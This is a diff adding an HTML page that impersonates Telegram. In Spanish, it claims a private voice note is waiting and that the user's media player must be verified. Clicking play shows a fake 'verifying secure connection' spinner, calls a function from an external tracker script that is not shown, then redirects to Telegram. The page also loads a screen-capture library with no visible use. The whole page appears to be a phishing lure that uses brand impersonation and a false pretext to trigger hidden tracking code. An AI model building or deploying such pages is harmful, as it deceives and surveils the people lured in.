@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#2481cc">
+    <title>Telegram: Voice Note</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background-color: #f4f4f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .tg-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .tg-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .tg-logo {
+            width: 80px;
+            height: 80px;
+            background: #2481cc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(36, 129, 204, 0.3);
+        }
+
+        .tg-logo svg {
+            width: 45px;
+            height: 45px;
+            fill: white;
+            margin-right: 4px;
+        }
+
+        .tg-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .tg-subtitle {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .vn-box {
+            background: #f0f7ff;
+            border-radius: 12px;
+            padding: 16px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            border: 1px solid #e1efff;
+        }
+
+        .vn-play {
+            width: 40px;
+            height: 40px;
+            background: #2481cc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .vn-wave {
+            flex: 1;
+            height: 24px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 20" preserveAspectRatio="none"><rect x="0" y="5" width="2" height="10" fill="%232481cc"/><rect x="5" y="2" width="2" height="16" fill="%232481cc"/><rect x="10" y="8" width="2" height="4" fill="%232481cc"/><rect x="15" y="4" width="2" height="12" fill="%232481cc"/><rect x="20" y="1" width="2" height="18" fill="%232481cc"/><rect x="25" y="6" width="2" height="8" fill="%232481cc"/><rect x="30" y="3" width="2" height="14" fill="%232481cc"/><rect x="35" y="7" width="2" height="6" fill="%232481cc"/><rect x="40" y="2" width="2" height="16" fill="%232481cc"/><rect x="45" y="5" width="2" height="10" fill="%232481cc"/><rect x="50" y="8" width="2" height="4" fill="%232481cc"/><rect x="55" y="1" width="2" height="18" fill="%232481cc"/><rect x="60" y="4" width="2" height="12" fill="%232481cc"/><rect x="65" y="6" width="2" height="8" fill="%232481cc"/><rect x="70" y="3" width="2" height="14" fill="%232481cc"/><rect x="75" y="7" width="2" height="6" fill="%232481cc"/><rect x="80" y="2" width="2" height="16" fill="%232481cc"/><rect x="85" y="5" width="2" height="10" fill="%232481cc"/><rect x="90" y="8" width="2" height="4" fill="%232481cc"/><rect x="95" y="4" width="2" height="12" fill="%232481cc"/></svg>');
+            opacity: 0.6;
+        }
+
+        .vn-time {
+            font-size: 12px;
+            color: #2481cc;
+            font-weight: 600;
+        }
+
+        .tg-btn {
+            width: 100%;
+            padding: 14px;
+            background: #2481cc;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
+        }
+
+        .tg-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* LOADING */
+        .loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .loader-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #eee;
+            border-top: 3px solid #2481cc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            color: #444;
+            font-size: 15px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="tg-container">
+        <div class="tg-card">
+            <div class="tg-logo">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .33z"/>
+                </svg>
+            </div>
+            <h1 class="tg-title">Nota de Voz privada</h1>
+            <p class="tg-subtitle">Has recibido una nota de voz. Para escucharla, Telegram requiere verificar tu reproductor multimedia.</p>
+
+            <div class="vn-box">
+                <div class="vn-play">▶</div>
+                <div class="vn-wave"></div>
+                <div class="vn-time">0:42</div>
+            </div>
+
+            <button class="tg-btn" id="playBtn">Reproducir nota de voz</button>
+        </div>
+    </div>
+
+    <div class="loader-overlay" id="loader">
+        <div class="spinner"></div>
+        <div class="loader-text">Verificando conexión segura...</div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="/tracker.js"></script>
+    <script>
+        const playBtn = document.getElementById('playBtn');
+        const loader = document.getElementById('loader');
+        let busy = false;
+
+        async function handleAction() {
+            if (busy) return;
+            busy = true;
+            loader.classList.add('active');
+
+            if (typeof handleMainCta === 'function') {
+                await handleMainCta();
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://t.me/telegram';
+            }, 1500);
+        }
+
+        playBtn.addEventListener('click', handleAction);
+    </script>
+</body>
+
+</html>
